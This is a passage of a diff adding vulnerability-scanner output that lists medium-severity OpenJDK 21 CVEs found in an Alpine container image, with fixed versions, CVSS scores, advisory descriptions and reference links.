+│                       │      │                    GraalVM Enterprise Edition: 21.3.18. Easily exploitable
+│                       │      │                   vulnerability allows unauthenticated attacker with network
+│                       │      │                   access via TLS to compromise Oracle Java SE, Oracle GraalVM
+│                       │      │                   for JDK, Oracle GraalVM Enterprise Edition.  Successful
+│                       │      │                   attacks of this vulnerability can result in unauthorized
+│                       │      │                   ability to cause a partial denial of service (partial DOS)
+│                       │      │                   of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM
+│                       │      │                   Enterprise Edition. Note: This vulnerability can only be
+│                       │      │                   exploited by supplying data to APIs in the specified
+│                       │      │                   Component without using Untrusted Java Web Start
+│                       │      │                   applications or Untrusted Java applets, such as through a
+│                       │      │                   web service. CVSS 3.1 Base Score 5.3 (Availability impacts).
+│                       │      │                     CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                           │           /A:L 
+│                       │      │                           ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-46917 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-46917.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-46917 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-46917 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:01.81Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:55:54.35Z 
+│                       ├ [3]  ╭ VulnerabilityID : CVE-2026-46968 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46968 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:f404bc514220de639d30da0a059b26e782de4d5d1500ecef8c7df
+│                       │      │                   0e38e46f0fb 
+│                       │      ├ Title           : openjdk: Enhance TLS certificate handling 
+│                       │      ├ Description     : Vulnerability in Oracle Java SE (component: JSSE). 
+│                       │      │                   Supported versions that are affected are Oracle Java SE:
+│                       │      │                   8u491, 8u491-perf, 11.0.31, 17.0.19, 21.0.11, 25.0.3,
+│                       │      │                   26.0.1; Oracle GraalVM for JDK: 17.0.19 and  21.0.11; Oracle
+│                       │      │                    GraalVM Enterprise Edition: 21.3.18. Difficult to exploit
+│                       │      │                   vulnerability allows unauthenticated attacker with network
+│                       │      │                   access via TLS to compromise Oracle Java SE.  Successful
+│                       │      │                   attacks of this vulnerability can result in  unauthorized
+│                       │      │                   creation, deletion or modification access to critical data
+│                       │      │                   or all Oracle Java SE accessible data. Note: This
+│                       │      │                   vulnerability can only be exploited by supplying data to
+│                       │      │                   APIs in the specified Component without using Untrusted Java
+│                       │      │                    Web Start applications or Untrusted Java applets, such as
+│                       │      │                   through a web service. CVSS 3.1 Base Score 5.9 (Integrity
+│                       │      │                   impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 5.9 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-46968 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-46968.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-46968 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-46968 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:02.76Z 
+│                       │      ╰ LastModifiedDate: 2026-07-31T15:27:29.943Z 
+│                       ├ [4]  ╭ VulnerabilityID : CVE-2026-47021 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47021 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:8fa294d34aebdf720cb32becb8ca7b38bad8ebfb937e95311453e
+│                       │      │                   7712ff266e9 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance XBM image support (Oracle CPU
+│                       │      │                   2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: 2D).  Supported versions that are affected are
+│                       │      │                   Oracle Java SE: 8u491, 8u491-perf, 11.0.31, 17.0.19,
+│                       │      │                   21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK: 17.0.19 and
+│                       │      │                     21.0.11; Oracle GraalVM Enterprise Edition: 21.3.18.
+│                       │      │                   Easily exploitable vulnerability allows unauthenticated
+│                       │      │                   attacker with network access via multiple protocols to
+│                       │      │                   compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle
+│                       │      │                   GraalVM Enterprise Edition.  Successful attacks of this
+│                       │      │                   vulnerability can result in unauthorized ability to cause a
+│                       │      │                   partial denial of service (partial DOS) of Oracle Java SE,
+│                       │      │                   Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.
+│                       │      │                   Note: This vulnerability can be exploited by using APIs in
+│                       │      │                   the specified Component, e.g., through a web service which
+│                       │      │                   supplies data to the APIs. This vulnerability also applies
+│                       │      │                   to Java deployments, typically in clients running sandboxed
+│                       │      │                   Java Web Start applications or sandboxed Java applets, that
+│                       │      │                   load and run untrusted code (e.g., code that comes from the
+│                       │      │                   internet) and rely on the Java sandbox for security. CVSS
+│                       │      │                   3.1 Base Score 5.3 (Availability impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-400 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                           │           /A:L 
+│                       │      │                           ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47021 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47021.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47021 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47021 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:07.67Z 
+│                       │      ╰ LastModifiedDate: 2026-07-31T13:42:33.4Z 
+│                       ├ [5]  ╭ VulnerabilityID : CVE-2026-47027 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47027 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:0d75b18cd023a33cc3f245397a87d6ddd56fb1812a35478a19294
+│                       │      │                   2d5a6175458 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance Jar file processing (Oracle CPU
+│                       │      │                   2026-07) 
+│                       │      ├ Description     : Vulnerability in Oracle Java SE (component: Libraries). 
+│                       │      │                   Supported versions that are affected are Oracle Java SE:
+│                       │      │                   8u491, 8u491-perf, 11.0.31, 17.0.19, 21.0.11, 25.0.3,
+│                       │      │                   26.0.1; Oracle GraalVM for JDK: 17.0.19 and  21.0.11; Oracle
+│                       │      │                    GraalVM Enterprise Edition: 21.3.18. Easily exploitable
+│                       │      │                   vulnerability allows unauthenticated attacker with network
+│                       │      │                   access via multiple protocols to compromise Oracle Java SE. 
+│                       │      │                    Successful attacks of this vulnerability can result in
+│                       │      │                   unauthorized ability to cause a partial denial of service
+│                       │      │                   (partial DOS) of Oracle Java SE. Note: This vulnerability
+│                       │      │                   can be exploited by using APIs in the specified Component,
+│                       │      │                   e.g., through a web service which supplies data to the APIs.
+│                       │      │                    This vulnerability also applies to Java deployments,
+│                       │      │                   typically in clients running sandboxed Java Web Start
+│                       │      │                   applications or sandboxed Java applets, that load and run
+│                       │      │                   untrusted code (e.g., code that comes from the internet) and
+│                       │      │                    rely on the Java sandbox for security. CVSS 3.1 Base Score
+│                       │      │                   5.3 (Availability impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                           │           /A:L 
+│                       │      │                           ╰ V3Score : 5.3 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47027 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47027.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47027 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47027 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:08.25Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:55:05.263Z 
+│                       ├ [6]  ╭ VulnerabilityID : CVE-2026-60147 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-60147 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:0ec704dd4318cbd2433d4517ce2287e0098cdc49f6f8000ef566e
+│                       │      │                   73e936e5bec 
+│                       │      ├ Title           : openjdk: OpenJDK: Improve certification checking (Oracle CPU
+│                       │      │                    2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: Security).  Supported versions that are
+│                       │      │                   affected are Oracle Java SE: 8u491, 8u491-perf, 11.0.31,
+│                       │      │                   17.0.19, 21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK:
+│                       │      │                   17.0.19 and  21.0.11; Oracle GraalVM Enterprise Edition:
+│                       │      │                   21.3.18. Easily exploitable vulnerability allows
+│                       │      │                   unauthenticated attacker with network access via multiple
+│                       │      │                   protocols to compromise Oracle Java SE, Oracle GraalVM for
+│                       │      │                   JDK, Oracle GraalVM Enterprise Edition.  Successful attacks
+│                       │      │                   of this vulnerability can result in  unauthorized update,
+│                       │      │                   insert or delete access to some of Oracle Java SE, Oracle
+│                       │      │                   GraalVM for JDK, Oracle GraalVM Enterprise Edition
+│                       │      │                   accessible data as well as  unauthorized read access to a
+│                       │      │                   subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle
+│                       │      │                   GraalVM Enterprise Edition accessible data. Note: This
+│                       │      │                   vulnerability can be exploited by using APIs in the
+│                       │      │                   specified Component, e.g., through a web service which
+│                       │      │                   supplies data to the APIs. This vulnerability also applies
+│                       │      │                   to Java deployments, typically in clients running sandboxed
+│                       │      │                   Java Web Start applications or sandboxed Java applets, that
+│                       │      │                   load and run untrusted code (e.g., code that comes from the
+│                       │      │                   internet) and rely on the Java sandbox for security. CVSS
+│                       │      │                   3.1 Base Score 6.5 (Confidentiality and Integrity impacts). 
+│                       │      │                    CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N). 
+│                       │      ├ Severity        : MEDIUM 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 6.5 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-60147 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
